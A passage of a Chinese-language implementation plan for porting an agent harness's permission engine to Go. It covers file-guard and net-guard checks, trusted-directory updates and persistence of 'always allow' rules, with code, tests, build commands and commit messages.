		checker := BuildFileGuardChecker(permissions, workspaceRoot, trustedDirs)
		if checker == nil {
			return nil
		}
		return checker
	})
	// 敏感路径注入（供 security.PreparePermissionsForEngine 调用）
	security.RegisterPermissionBridges(MergePackageSensitivePaths, nil, nil)
}
```

在 `netguard` 的 `init` 里补（Task 8 Step 5）：

```go
func init() {
	security.RegisterNetGuardFactory(func(permissions map[string]any) security.NetGuardEvaluator {
		checker := BuildNetGuardChecker(permissions)
		if checker == nil {
			return nil
		}
		return checker
	})
	// net_urls 注入与存在性判定（供 security.PreparePermissionsForEngine 调用）
	security.RegisterPermissionBridges(nil, MergePackageNetURLs, HasPackageNetURLs)
}
```

最后把 `PreparePermissionsForEngine` 里的 `fileguardBridge.` 前缀改成调用上述非导出函数：

```go
	if fg := mapAnyOrNil(cfg["file_guard"]); fg != nil && truthy(fg["enabled"]) {
		if !hasBuiltinLayer(fg["paths"]) {
			cfg = applySensitivePaths(cfg)
		}
	}
	if ng := mapAnyOrNil(cfg["net_guard"]); ng != nil && truthy(ng["enabled"]) {
		if !hasPackageNetURLsIn(ng["urls"]) {
			cfg = applyNetURLs(cfg)
		}
	}
```

`CheckPermission`：

```go
// CheckPermission 检查工具调用权限。A/B/C 三段取最严。
//
// Python: PermissionEngine.check_permission(tool_name, tool_args)
func (e *PermissionEngine) CheckPermission(ctx context.Context, toolName string, toolArgs map[string]any) *PermissionResult {
	e.mu.RLock()
	enabled := e.enabled
	checksActive := e.permissionChecksActive
	sceneHook := e.sceneHook
	config := e.config
	fileGuard := e.fileGuard
	netGuard := e.netGuard
	e.mu.RUnlock()

	if !enabled {
		logger.Info(logComponent).Msg("permission.check.skip reason=system_disabled decision=allow")
		return &PermissionResult{Permission: PermissionLevelAllow, Reason: "Permission system is disabled"}
	}
	if checksActive != nil && !checksActive() {
		logger.Info(logComponent).Msg("permission.check.skip reason=permission_checks_inactive decision=allow")
		return &PermissionResult{Permission: PermissionLevelAllow, Reason: "Tool permission checks are inactive for this context"}
	}
	if toolArgs == nil {
		toolArgs = map[string]any{}
	}

	// 0. 场景钩子短路
	if sceneHook != nil {
		// ...（保留原有实现，不变）
	}

	// 1. Pipeline A
	var externalPaths []string
	permission, matchedRule, evalErr := evaluateGlobalPolicyWithSnapshot(config, toolName, toolArgs, false)
	if evalErr != nil {
		logger.Warn(logComponent).Str("tool", toolName).Err(evalErr).Msg("permission.evaluate_global_policy.failed")
		permission = PermissionLevelNone
		matchedRule = ""
	}
	if permission == PermissionLevelNone {
		permission = PermissionLevelAsk
		matchedRule = "default"
	}

	// 2. Pipeline B：file_guard
	if fileGuard != nil {
		if pathResult := fileGuard.Evaluate(toolName, toolArgs); pathResult != nil {
			pathRule := pathResult.MatchedRule
			if pathRule == "" {
				pathRule = "file_guard"
			}
			logger.Info(logComponent).
				Str("tool", toolName).
				Bool("checked", true).
				Str("permission", pathResult.Permission.String()).
				Str("matched_rule", pathRule).
				Strs("external_paths", pathResult.ExternalPaths).
				Str("merged_with", permission.String()).
				Msg("permission.file_guard.result")
			permission = Strictest(permission, pathResult.Permission)
			matchedRule = matchedRule + "|" + pathRule
			externalPaths = pathResult.ExternalPaths
		} else {
			logger.Info(logComponent).Str("tool", toolName).Bool("checked", true).
				Str("permission", "none").Str("matched_rule", "none").Msg("permission.file_guard.result")
		}
	} else {
		logger.Info(logComponent).Str("tool", toolName).Bool("checked", false).
			Str("reason", "disabled").Msg("permission.file_guard.result")
	}

	// 3. Pipeline C：net_guard
	if netGuard != nil {
		if netResult := netGuard.Evaluate(toolName, toolArgs); netResult != nil {
			netRule := netResult.MatchedRule
			if netRule == "" {
				netRule = "net_guard"
			}
			logger.Info(logComponent).
				Str("tool", toolName).
				Bool("checked", true).
				Str("permission", netResult.Permission.String()).
				Str("matched_rule", netRule).
				Str("merged_with", permission.String()).
				Msg("permission.net_guard.result")
			permission = Strictest(permission, netResult.Permission)
			matchedRule = matchedRule + "|" + netRule
		} else {
			logger.Info(logComponent).Str("tool", toolName).Bool("checked", true).
				Str("permission", "none").Str("matched_rule", "none").Msg("permission.net_guard.result")
		}
	} else {
		logger.Info(logComponent).Str("tool", toolName).Bool("checked", false).
			Str("reason", "disabled").Msg("permission.net_guard.result")
	}

	return &PermissionResult{
		Permission:    permission,
		MatchedRule:   matchedRule,
		Reason:        getReason(permission, toolName, matchedRule),
		ExternalPaths: externalPaths,
	}
}
```

`UpdateTrustedDirs` / `TrustedDirs` / `rebuildGuards`：

```go
// UpdateTrustedDirs 更新受信目录并重建判定器。
//
// Python: PermissionEngine.update_trusted_dirs(trusted_dirs)
func (e *PermissionEngine) UpdateTrustedDirs(trustedDirs []string) {
	normalized := make([]string, 0, len(trustedDirs))
	for _, d := range trustedDirs {
		d = strings.TrimSpace(d)
		if d == "" {
			continue
		}
		normalized = append(normalized, resolveUserPath(d))
	}
	e.mu.Lock()
	e.trustedDirs = normalized
	e.mu.Unlock()
	e.rebuildGuards()
}

// TrustedDirs 返回当前受信目录副本。
//
// Python: PermissionEngine.trusted_dirs（property）
func (e *PermissionEngine) TrustedDirs() []string {
	e.mu.RLock()
	defer e.mu.RUnlock()
	out := make([]string, len(e.trustedDirs))
	copy(out, e.trustedDirs)
	return out
}

// rebuildGuards 重建 file_guard 与 net_guard 判定器。
//
// 先在读锁内快照配置，再在锁外构造（构造可能编译正则/读 YAML，耗时较长，
// 不应持锁），最后写锁内替换。构造期间 config 若被并发修改，判定器会是
// 旧配置的——下一次 rebuildGuards 会纠正，这与 Python 的行为一致。
//
// Python: PermissionEngine._rebuild_file_guard()
func (e *PermissionEngine) rebuildGuards() {
	e.mu.RLock()
	config := e.config
	workspace := e.workspaceRoot
	trusted := append([]string(nil), e.trustedDirs...)
	e.mu.RUnlock()

	fileGuard := newFileGuardEvaluator(config, workspace, trusted)
	netGuard := newNetGuardEvaluator(config)

	e.mu.Lock()
	e.fileGuard = fileGuard
	e.netGuard = netGuard
	e.mu.Unlock()
}
```

`UpdateConfig` 改为走 `PreparePermissionsForEngine` + `rebuildGuards`。

- [ ] **Step 5: 删除 `checker.go` 与 `checker_test.go`**

```bash
cd /home/opensource/uapclaw-gateway
git rm internal/agentcore/harness/security/checker.go internal/agentcore/harness/security/checker_test.go
grep -rn "ExternalDirectoryChecker\|CheckExternalPaths\|NewExternalDirectoryChecker" --include=*.go internal/ tests/ cmd/
```

Expected: 只剩 `tool_security_rail.go:722`（Task 11 处理）。其余必须为 0。

- [ ] **Step 6: 修 `tool_security_rail.go` 的 checker 引用（临时最小改动）**

删除 `collectExternalDirectoryPersistPaths` 整个方法，把 `persistAllowAlways` 里对它的调用改为直接取引擎判定结果：

```go
// persistAllowAlways 工具级「始终允许」持久化。
//
// ⚠️ 临时实现：Task 11 会重构为 persistMergedAllow 三层结构。
// 本步只保证删除 checker.go 后能编译通过。
func (r *PermissionInterruptRail) persistAllowAlways(normalizedName string, toolArgs map[string]any) bool {
	cfg := utils.DeepCopyMap(r.engine.Config())

	cfg, okTool := harnesssecurity.MergePermissionAllowRuleIntoPermissions(cfg, normalizedName, toolArgs)

	// 临时：用引擎判定取 ASK 的外部路径。Task 11 改为
	// collectFileGuardPersistAccesses + MergeFileGuardAccessAllows。
	var extPaths []string
	if result := r.engine.CheckPermission(context.Background(), normalizedName, toolArgs); result != nil &&
		result.Permission == harnesssecurity.PermissionLevelAsk {
		extPaths = result.ExternalPaths
	}

	var okExt bool
	if len(extPaths) > 0 {
		cfg, okExt = harnesssecurity.MergeExternalDirectoryAllowIntoPermissions(cfg, extPaths)
	}
	if !okTool && !okExt {
		return false
	}

	prevCfg := utils.DeepCopyMap(r.engine.Config())
	r.UpdateConfig(cfg, nil)

	if r.host.PersistAllowRule != nil {
		persisted := func() bool {
			defer func() {
				if rec := recover(); rec != nil {
					logger.Warn(logComponent).
						Interface("recover", rec).
						Msg("permission.persist.host_failed")
				}
			}()
			return r.host.PersistAllowRule(cfg)
		}()
		if !persisted {
			r.UpdateConfig(prevCfg, nil)
		}
		return persisted
	}

	if !harnesssecurity.WritePermissionsSectionToAgentConfigYAML(r.host.PermissionYAMLPath, cfg) {
		r.UpdateConfig(prevCfg, nil)
		return false
	}
	return true
}
```

同时删除方法 `collectExternalDirectoryPersistPaths`（整个函数体），`tool_security_rail.go` 需要加 `"context"` import。

```bash
CGO_ENABLED=1 go build -tags test ./internal/agentcore/harness/rails/security/ && echo BUILD_OK
```

Expected: `BUILD_OK`。

- [ ] **Step 7: 修 `permission_engine_test.go` 的既有用例**

删除 `TestPermissionEngine_SetWorkspaceRoot`。其余用例若引用 `externalChecker`，改为引用 `fileGuard`。

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/ 2>&1 | tail -20
```

Expected: 全部 PASS。

- [ ] **Step 8: 全量回归**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./... 2>&1 | grep -E "^(FAIL|---)" | head -20
```

Expected: 无 FAIL。若有失败，多为「新增 fileguard/netguard 导致判定更严」，逐个核对后改断言。

- [ ] **Step 9: 提交**

```bash
gofmt -l internal/agentcore/harness/security/
git add internal/agentcore/harness/security/permission_engine.go \
        internal/agentcore/harness/security/fileguard_evaluator.go \
        internal/agentcore/harness/security/models.go \
        internal/agentcore/harness/security/permission_engine_test.go \
        internal/agentcore/harness/rails/security/tool_security_rail.go \
        internal/agentcore/harness/security/doc.go
git commit -m "feat(security): PermissionEngine 重写为 A/B/C 三段取最严

对齐 core.py check_permission：Pipeline A（toolguard 工具策略）→
Pipeline B（fileguard 路径防护）→ Pipeline C（netguard 网络防护）→
strictest。B 段返回 nil 时不改动 A 段结果但仍打日志；C 段不写
external_paths。

新增 PreparePermissionsForEngine 四步注入（命令规则 → 敏感路径 →
net_urls → action 补齐），每次构造与 update_config 都走它。

新增 UpdateTrustedDirs / TrustedDirs，删除 SetWorkspaceRoot（零生产
调用方，Python 无此方法）。

删除 checker.go（303 行 ExternalDirectoryChecker）与 checker_test.go
（338 行）：Python 侧无此结构，Go 自研的它在 B 段落地后完全被替代。

security 定义 FileGuardEvaluator / NetGuardEvaluator 接口与工厂变量，
子包在 init 中注册实现，避免循环依赖。"
git show --stat HEAD
```

---

## Task 10：`security/patterns.go` 的 `MergeFileGuardAccessAllows`

**Files:**
- Modify: `internal/agentcore/harness/security/patterns.go`
- Modify: `internal/agentcore/harness/security/patterns_test.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/approve/persist_rule_merge.py`

- [ ] **Step 1: 读 Python 实现**

```bash
grep -n "def merge_file_guard_access_allows" -A60 /home/opensource/agent-core/openjiuwen/harness/security/permission_engine/approve/persist_rule_merge.py
grep -n "def merge_file_guard_path_rule" -A40 /home/opensource/agent-core/openjiuwen/harness/security/permission_engine/approve/persist_rule_merge.py
```

- [ ] **Step 2: 写失败测试（从 Python 测试反推）**

```bash
sed -n '60,120p' /home/opensource/agent-core/tests/unit_tests/harness/security/test_file_guard_persist.py
```

据此写 Go 用例，至少覆盖：

```go
// TestMergeFileGuardAccessAllows_read保留精确目录 测试 read 访问写精确路径不写 /**
func TestMergeFileGuardAccessAllows_read保留精确目录(t *testing.T) {
	perms := map[string]any{"file_guard": map[string]any{"enabled": true}}
	target := "/tmp/exact/file.txt"

	merged, wrote := MergeFileGuardAccessAllows(perms, []PathAction{{Path: target, Action: "read"}})
	if !wrote {
		t.Fatal("未写入")
	}
	fg, _ := merged["file_guard"].(map[string]any)
	paths, _ := fg["paths"].([]any)
	if len(paths) != 1 {
		t.Fatalf("paths 条数 = %d, want 1", len(paths))
	}
	rule, _ := paths[0].(map[string]any)
	if rule["path"] != target {
		t.Errorf("path = %v, want %v（精确路径，不加 /**）", rule["path"], target)
	}
	if rule["read"] != "allow" {
		t.Errorf("read = %v, want allow", rule["read"])
	}
	if rule["write"] != "ask" {
		t.Errorf("write = %v, want ask（read 访问不授权写）", rule["write"])
	}
}

// TestMergeFileGuardAccessAllows_write升格 测试 write 访问把三轴一起提上去
func TestMergeFileGuardAccessAllows_write升格(t *testing.T) {
	perms := map[string]any{"file_guard": map[string]any{"enabled": true}}
	target := "/tmp/w/file.txt"

	first, _ := MergeFileGuardAccessAllows(perms, []PathAction{{Path: target, Action: "read"}})
	second, wrote := MergeFileGuardAccessAllows(first, []PathAction{{Path: target, Action: "write"}})
	if !wrote {
		t.Fatal("write 访问未写入")
	}
	fg, _ := second["file_guard"].(map[string]any)
	paths, _ := fg["paths"].([]any)
	rule, _ := paths[0].(map[string]any)
	if rule["write"] != "allow" {
		t.Errorf("write = %v, want allow", rule["write"])
	}
	if rule["read"] != "allow" {
		t.Errorf("read = %v, want allow（Write⇒Read 蕴含）", rule["read"])
	}
}

// TestMergeFileGuardAccessAllows_无访问不写 测试空访问列表不产生变更
func TestMergeFileGuardAccessAllows_无访问不写(t *testing.T) {
	perms := map[string]any{"file_guard": map[string]any{"enabled": true}}
	_, wrote := MergeFileGuardAccessAllows(perms, nil)
	if wrote {
		t.Error("空访问列表不应写入")
	}
}

// TestMergeFileGuardAccessAllows_不修改入参 测试深拷贝
func TestMergeFileGuardAccessAllows_不修改入参(t *testing.T) {
	perms := map[string]any{"file_guard": map[string]any{"enabled": true}}
	_, _ = MergeFileGuardAccessAllows(perms, []PathAction{{Path: "/tmp/x", Action: "read"}})
	fg, _ := perms["file_guard"].(map[string]any)
	if _, has := fg["paths"]; has {
		t.Error("入参被修改")
	}
}
```

- [ ] **Step 3: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/ -run TestMergeFileGuardAccessAllows 2>&1 | head
```

Expected: `undefined: MergeFileGuardAccessAllows`。

- [ ] **Step 4: 实现**

```go
// MergeFileGuardAccessAllows 按 (path, action) 写入 file_guard.paths。
//
// 这是 HITL「总是允许」的主路径：read 访问只放开 read 轴，write 访问放开
// read+write（Write⇒Read 蕴含），exec 访问放开 read+exec。
//
// Python: merge_file_guard_access_allows(permissions, accesses)
func MergeFileGuardAccessAllows(permissions map[string]any, accesses []PathAction) (map[string]any, bool) {
	if len(accesses) == 0 {
		return utils.DeepCopyMap(permissions), false
	}
	perms := utils.DeepCopyMap(permissions)
	wrote := false
	for _, acc := range accesses {
		if strings.TrimSpace(acc.Path) == "" {
			continue
		}
		pathNorm := strings.TrimSuffix(strings.ReplaceAll(acc.Path, `\`, "/"), "/")
		if pathNorm == "" {
			continue
		}
		read, write, execP := axesForFileGuardAction(acc.Action)
		var did bool
		perms, did = mergeFileGuardPathRule(perms, pathNorm, read, write, execP, "prefix")
		wrote = wrote || did
	}
	return perms, wrote
}

// mergeFileGuardPathRule 合并一条 file_guard.paths 规则。
// 同 path 已存在时按轴「仅向 allow 抬升」，不降级已有 allow/deny。
//
// Python: merge_file_guard_path_rule(permissions, path, *, read, write, exec_, match)
func mergeFileGuardPathRule(perms map[string]any, pathNorm, read, write, execP, match string) (map[string]any, bool) {
	if pathNorm == "" {
		return utils.DeepCopyMap(perms), false
	}
	out := utils.DeepCopyMap(perms)

	fg, ok := out["file_guard"].(map[string]any)
	if !ok {
		fg = map[string]any{}
		out["file_guard"] = fg
	}
	fg["enabled"] = true
	paths, ok := fg["paths"].([]any)
	if !ok {
		paths = []any{}
		fg["paths"] = paths
	}

	for i, item := range paths {
		existing, ok := item.(map[string]any)
		if !ok {
			continue
		}
		existingPath, _ := existing["path"].(string)
		if strings.TrimSuffix(strings.ReplaceAll(existingPath, `\`, "/"), "/") != pathNorm {
			continue
		}
		mergedRead := escalateAxisTowardAllow(existing["read"], read)
		mergedWrite := escalateAxisTowardAllow(existing["write"], write)
		mergedExec := escalateAxisTowardAllow(existing["exec"], execP)
		mergedMatch := "prefix"
		if m, ok := existing["match"].(string); ok && m != "" {
			mergedMatch = m
		} else if match != "" {
			mergedMatch = match
		}
		unchanged := existing["read"] == mergedRead &&
			existing["write"] == mergedWrite &&
			existing["exec"] == mergedExec &&
			stringOrDefault(existing["match"], "prefix") == mergedMatch
		if unchanged {
			return out, false
		}
		merged := shallowCopyMap(existing)
		merged["path"] = pathNorm
		merged["read"] = mergedRead
		merged["write"] = mergedWrite
		merged["exec"] = mergedExec
		merged["match"] = mergedMatch
		paths[i] = merged
		logger.Info(logComponent).
			Str("path", pathNorm).
			Str("read", mergedRead).
			Str("write", mergedWrite).
			Str("exec", mergedExec).
			Msg("permission.merge.file_guard")
		return out, true
	}

	paths = append(paths, map[string]any{
		"path":  pathNorm,
		"read":  read,
		"write": write,
		"exec":  execP,
		"match": match,
	})
	fg["paths"] = paths
	logger.Info(logComponent).
		Str("path", pathNorm).
		Str("read", read).
		Str("write", write).
		Str("exec", execP).
		Msg("permission.merge.file_guard")
	return out, true
}

// axesForFileGuardAction HITL「总是允许」按当时的 path action 落盘，
// 避免 read 场景顺带写开放 write。
//
// Python: _axes_for_file_guard_action(action)
func axesForFileGuardAction(action string) (read, write, execP string) {
	act := strings.ToLower(strings.TrimSpace(action))
	if act == "" {
		act = "read"
	}
	switch act {
	case "write":
		return "allow", "allow", "ask"
	case "exec":
		return "allow", "ask", "allow"
	}
	return "allow", "ask", "ask"
}

// escalateAxisTowardAllow 合并同 path 规则：仅在 new=allow 时抬升，
// 不降级已有 allow/ask/deny。
//
// Python: _escalate_axis_toward_allow(old, new)
func escalateAxisTowardAllow(old any, newLevel string) string {
	if newLevel == "allow" {
		return "allow"
	}
	if s, ok := old.(string); ok {
		switch s {
		case "allow", "ask", "deny":
			return s
		}
	}
	return newLevel
}
```

`PathAction` 来自 `security` 包（Task 9 定义），本文件需 `harnesssecurity.PathAction` 前缀或直接同包引用——`patterns.go` 在 `security` 包内，直接写 `PathAction`。

- [ ] **Step 5: 运行测试 + 提交**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/ -run TestMergeFileGuardAccessAllows -v 2>&1 | tail
gofmt -l internal/agentcore/harness/security/
git add internal/agentcore/harness/security/patterns.go internal/agentcore/harness/security/patterns_test.go
git commit -m "feat(security): MergeFileGuardAccessAllows 按轴写入 file_guard.paths

对齐 persist_rule_merge.py。read 访问写精确目录规则（不加 /**），
write 访问把三轴一起提（Write⇒Read 蕴含）。

这是「总是允许」的落盘位置对齐：此前 Go 写 external_directory.allow，
而 B 段读的是 file_guard.paths，两者对不上——用户点了允许下次还会被问。"
git show --stat HEAD
```

---

## Task 11：`tool_security_rail` 改造

**Files:**
- Modify: `internal/agentcore/harness/rails/security/tool_security_rail.go`
- Modify: `internal/agentcore/harness/rails/security/tool_security_rail_test.go`
- Modify: `internal/agentcore/harness/security/models.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/rails/security/tool_security_rail.py:261-388`

- [ ] **Step 1: 补别名（缺 `web_fetch_webpage`）**

改 `tool_security_rail.go:71-78`：

```go
// toolNameAliases 工具名别名映射。
//
// 与 common/permission_tools 的 PERMISSION_TOOL_ALIASES 是两份独立数据：
// 本表多 web_fetch_webpage（5 项），服务于中断卡的展示名归一化，无 conflict
// 检测。对齐 Python TOOL_NAME_ALIASES (tool_security_rail.py L48-54)。
var toolNameAliases = map[string]string{
	"free_search":       "mcp_free_search",
	"paid_search":       "mcp_paid_search",
	"fetch_webpage":     "mcp_fetch_webpage",
	"web_fetch_webpage": "mcp_fetch_webpage",
	"exec_command":      "mcp_exec_command",
}
```

- [ ] **Step 2: 写失败测试——别名补齐**

```go
// TestNormalizeToolName_web_fetch_webpage 测试新增别名
func TestNormalizeToolName_web_fetch_webpage(t *testing.T) {
	rail := NewPermissionInterruptRail(map[string]any{}, nil, nil, nil, "", nil)
	if got := rail.normalizeToolName("web_fetch_webpage"); got != "mcp_fetch_webpage" {
		t.Errorf("normalizeToolName(web_fetch_webpage) = %q, want mcp_fetch_webpage", got)
	}
}
```

- [ ] **Step 3: 给 `ToolPermissionHost` 加 `PersistSessionAllowRule`**

改 `models.go:128-143`：

```go
// ToolPermissionHost 权限宿主回调集合。
//
// Python: @dataclass ToolPermissionHost (host.py)
type ToolPermissionHost struct {
	// GetPermissionsSnapshot 返回与 config['permissions'] 同结构的 dict
	GetPermissionsSnapshot func() map[string]any
	// PersistAllowRule 自定义「总是允许」写盘
	PersistAllowRule func(permissions map[string]any) bool
	// PersistSessionAllowRule 自定义「会话内记住」写盘。
	// 产品层应写入该 sessionID 的 Session 文件；未设置时护栏只更新内存。
	PersistSessionAllowRule func(permissions map[string]any, sessionID string) bool
	// ResolveWorkspaceDir 外部路径校验用的 workspace 根目录
	ResolveWorkspaceDir func() string
	// PermissionYAMLPath Agent 配置文件路径
	PermissionYAMLPath string
	// ToolPermissionChecksActive 若返回假则跳过工具权限校验
	ToolPermissionChecksActive func() bool
	// RequestPermissionConfirmation 对 ASK 征求用户确认
	RequestPermissionConfirmation RequestPermissionConfirmationHook
	// PermissionSceneHook 宿主场景钩子
	PermissionSceneHook PermissionSceneHookFn
}
```

- [ ] **Step 4: 写失败测试——`persistMergedAllow` 的三层结构**

```go
// TestPersistMergedAllow_snapshot优先 测试 base_cfg 先取 host snapshot
func TestPersistMergedAllow_snapshot优先(t *testing.T) {
	var snapshotCalled bool
	host := &harnesssecurity.ToolPermissionHost{
		GetPermissionsSnapshot: func() map[string]any {
			snapshotCalled = true
			return map[string]any{"tools": map[string]any{"bash": "ask"}}
		},
		PersistAllowRule: func(map[string]any) bool { return true },
	}
	rail := NewPermissionInterruptRail(map[string]any{}, nil, nil, nil, "", host)
	_ = rail.persistMergedAllow("bash", map[string]any{"command": "ls"}, host.PersistAllowRule, true, "")
	if !snapshotCalled {
		t.Error("未调用 host.GetPermissionsSnapshot")
	}
}

// TestPersistMergedAllow_写盘失败回滚 测试 persist 返回 false 时配置回滚
func TestPersistMergedAllow_写盘失败回滚(t *testing.T) {
	host := &harnesssecurity.ToolPermissionHost{
		PersistAllowRule: func(map[string]any) bool { return false },
	}
	initial := map[string]any{"tools": map[string]any{"bash": "ask"}}
	rail := NewPermissionInterruptRail(initial, nil, nil, nil, "", host)
	before := utils.DeepCopyMap(rail.engine.Config())

	_ = rail.persistMergedAllow("bash", map[string]any{"command": "ls -la"}, host.PersistAllowRule, true, "")

	after := rail.engine.Config()
	if !reflect.DeepEqual(before, after) {
		t.Error("写盘失败后配置未回滚")
	}
}

// TestPersistSessionAllow_不写YAML 测试 session 版 writeYAMLFallback=false
func TestPersistSessionAllow_不写YAML(t *testing.T) {
	yamlPath := filepath.Join(t.TempDir(), "config.yaml")
	host := &harnesssecurity.ToolPermissionHost{PermissionYAMLPath: yamlPath}
	rail := NewPermissionInterruptRail(map[string]any{"tools": map[string]any{"bash": "ask"}}, nil, nil, nil, "", host)

	// 无 PersistSessionAllowRule 时，session 版应只更新内存并返回 true
	ok := rail.persistSessionAllow("bash", map[string]any{"command": "ls"}, "sess-1")
	if !ok {
		t.Error("session 版应返回 true（只更新内存）")
	}
	if _, err := os.Stat(yamlPath); err == nil {
		t.Error("session 版不应写 YAML")
	}
}
```

- [ ] **Step 5: 重构 `persistAllowAlways` 为三层**

```go
// persistAllowAlways 永久允许：合并后走 persist_allow_rule（无 Host 则写 YAML）。
//
// Python: PermissionInterruptRail._persist_allow_always(normalized_name, tool_args, *, session_id)
func (r *PermissionInterruptRail) persistAllowAlways(normalizedName string, toolArgs map[string]any) bool {
	return r.persistMergedAllow(normalizedName, toolArgs, r.host.PersistAllowRule, true, "")
}

// persistSessionAllow 会话内记住：合并后走 persist_session_allow_rule
// （无钩子则只更新内存，不写 YAML）。
//
// Python: PermissionInterruptRail._persist_session_allow(normalized_name, tool_args, *, session_id)
func (r *PermissionInterruptRail) persistSessionAllow(normalizedName string, toolArgs map[string]any, sessionID string) bool {
	return r.persistMergedAllow(normalizedName, toolArgs, nil, false, sessionID)
}

// persistMergedAllow 工具级记住与 file_guard 路径白名单：先合并快照，再写盘。
//
// 步骤顺序（对齐 tool_security_rail.py:331-388）：
//  1. base_cfg：先试 host.get_permissions_snapshot，失败回落 engine.config 深拷贝
//  2. 合并工具级 allow 规则
//  3. 收集本次判定为 ASK 的 file_guard 访问
//  4. 合并 file_guard 路径白名单
//  5. 两者都没写入 → 返回 false
//  6. 记 prev_cfg → update_config →（钩子存在时）调钩子；失败回滚
//  7. 无钩子且 writeYAMLFallback=false → 返回 true（只更新内存）
//  8. 无钩子且 writeYAMLFallback=true → 写 YAML；失败回滚
func (r *PermissionInterruptRail) persistMergedAllow(
	normalizedName string,
	toolArgs map[string]any,
	persistHook func(map[string]any) bool,
	writeYAMLFallback bool,
	sessionID string,
) bool {
	// 1. base_cfg
	var baseCfg map[string]any
	if r.host.GetPermissionsSnapshot != nil {
		func() {
			defer func() {
				if rec := recover(); rec != nil {
					logger.Debug(logComponent).Interface("recover", rec).
						Msg("permission.persist.snapshot_failed")
				}
			}()
			if snap := r.host.GetPermissionsSnapshot(); snap != nil {
				baseCfg = snap
			}
		}()
	}
	if baseCfg == nil {
		baseCfg = utils.DeepCopyMap(r.engine.Config())
	}

	// 2. 工具级 allow
	cfg, okTool := harnesssecurity.MergePermissionAllowRuleIntoPermissions(baseCfg, normalizedName, toolArgs)

	// 3. 收集 file_guard ASK 访问
	accesses := r.collectFileGuardPersistAccesses(normalizedName, toolArgs, cfg)

	// 4. 合并路径白名单
	okExt := false
	if len(accesses) > 0 {
		cfg, okExt = harnesssecurity.MergeFileGuardAccessAllows(cfg, accesses)
	}
	if !okTool && !okExt {
		return false
	}

	// 5. 回滚基线 + 应用
	prevCfg := utils.DeepCopyMap(r.engine.Config())
	r.UpdateConfig(cfg, nil)

	// 6. 钩子路径
	if persistHook != nil {
		persisted := func() bool {
			defer func() {
				if rec := recover(); rec != nil {
					logger.Warn(logComponent).Interface("recover", rec).
						Msg("permission.persist.host_failed")
				}
			}()
			return persistHook(cfg)
		}()
		if !persisted {
			r.UpdateConfig(prevCfg, nil)
		}
		return persisted
	}

	// 7. session 版不写 YAML
	if !writeYAMLFallback {
		return true
	}

	// 8. YAML 兜底
	if !harnesssecurity.WritePermissionsSectionToAgentConfigYAML(r.host.PermissionYAMLPath, cfg) {
		r.UpdateConfig(prevCfg, nil)
		return false
	}
	return true
}

// collectFileGuardPersistAccesses 若本次调用路径层为 ASK，返回需落盘的访问。
//
// Python: PermissionInterruptRail._collect_file_guard_persist_accesses(
//            normalized_name, tool_args, permissions_cfg)
func (r *PermissionInterruptRail) collectFileGuardPersistAccesses(
	normalizedName string,
	toolArgs map[string]any,
	permissionsCfg map[string]any,
) []harnesssecurity.PathAction {
	if r.host.ResolveWorkspaceDir == nil {
		return nil
	}
	var workspace string
	func() {
		defer func() {
			if rec := recover(); rec != nil {
				logger.Debug(logComponent).Interface("recover", rec).
					Msg("permission.persist.external.workspace_resolve_failed")
			}
		}()
		workspace = r.host.ResolveWorkspaceDir()
	}()
	if workspace == "" {
		return nil
	}
	// 用引擎的 per-request trusted_dirs，使落盘时的外部路径检测与运行时判定一致
	trustedDirs := r.engine.TrustedDirs()

	evaluator := harnesssecurity.NewFileGuardEvaluator(permissionsCfg, workspace, trustedDirs)
	if evaluator == nil {
		return nil
	}
	accesses := evaluator.CollectAskAccesses(normalizedName, toolArgs)
	return accesses
}
```

> `NewFileGuardEvaluator` 已由 Task 9 Step 3 在 `security/fileguard_evaluator.go` 中定义（导出包装），此处直接调用即可。

- [ ] **Step 6: 加 `SetTrustedDirs`**

```go
// SetTrustedDirs 每次请求热更新受信目录。
//
// 宿主（如数字分身 adapter）在请求到达时调用，使外部路径检查把这些子树
// 视为内部，跳过 ask/deny。
//
// Python: PermissionInterruptRail.set_trusted_dirs(trusted_dirs)
func (r *PermissionInterruptRail) SetTrustedDirs(trustedDirs []string) {
	normalized := make([]string, 0, len(trustedDirs))
	for _, d := range trustedDirs {
		d = strings.TrimSpace(d)
		if d == "" {
			continue
		}
		if resolved, err := filepath.Abs(d); err == nil {
			normalized = append(normalized, resolved)
		} else {
			normalized = append(normalized, d)
		}
	}
	r.engine.UpdateTrustedDirs(normalized)
	logger.Info(logComponent).Int("count", len(normalized)).
		Msg("permission.rail.trusted_dirs_updated")
}
```

- [ ] **Step 7: 跑测试 + 全量**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/rails/security/ -v 2>&1 | tail -20
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./... 2>&1 | grep "^FAIL" | head
```

Expected: 全部 PASS。

- [ ] **Step 8: 提交**

```bash
gofmt -l internal/agentcore/harness/rails/security/ internal/agentcore/harness/security/
git add internal/agentcore/harness/rails/security/tool_security_rail.go \
        internal/agentcore/harness/rails/security/tool_security_rail_test.go \
        internal/agentcore/harness/security/models.go \
        internal/agentcore/harness/security/fileguard_evaluator.go
git commit -m "feat(rails): 持久化三层重构 + trusted_dirs 热更新 + 别名补齐

persistAllowAlways 拆为三层对齐 Python：
- persistAllowAlways      → _persist_allow_always（薄封装）
- persistSessionAllow     → _persist_session_allow（新增）
- persistMergedAllow      → _persist_merged_allow（共用实现）

四个易漏点全部照抄：base_cfg 先试 snapshot 再回落 engine.config；
prev_cfg 在 update_config 之前取；session 版不写 YAML 返回 true；
钩子存在时优先走钩子。

collectExternalDirectoryPersistPaths 改为
collectFileGuardPersistAccesses，返回 (path, action) 而非 []string，
落盘位置从 external_directory.allow 改为 file_guard.paths 按轴。

toolNameAliases 补 web_fetch_webpage（4 → 5 项，对齐 Python
TOOL_NAME_ALIASES）。

新增 SetTrustedDirs（请求级热更新）与 host.PersistSessionAllowRule。"
git show --stat HEAD
```

---

## Task 12：9.90b 无依赖四文件

**Files:**
- Create: `internal/swarm/agents/harness/common/rails/permissions/execution_provider_contract.go`
- Create: `internal/swarm/agents/harness/common/rails/permissions/sandbox_profile.go`
